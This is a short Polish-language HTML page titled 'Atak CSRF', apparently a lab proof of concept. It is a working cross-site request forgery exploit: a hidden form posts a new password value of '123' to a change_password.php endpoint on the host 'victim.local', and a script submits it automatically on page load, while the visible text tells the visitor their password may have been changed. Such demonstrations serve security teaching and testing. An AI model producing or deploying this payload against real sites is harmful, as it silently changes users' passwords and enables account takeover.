<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Atak CSRF</title>
</head>
<body>
    <h1>Atak CSRF</h1>
    <p>Jeśli widzisz tę stronę, Twoje hasło mogło zostać zmienione!</p>

    <!-- Ukryty formularz, który automatycznie wysyła żądanie POST do change_password.php -->
    <form id="csrfForm" action="http://victim.local/change_password.php" method="POST">
        <input type="hidden" name="new_password" value="123">
    </form>

    <script>
        // Automatycznie wysyłamy formularz po załadowaniu strony
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>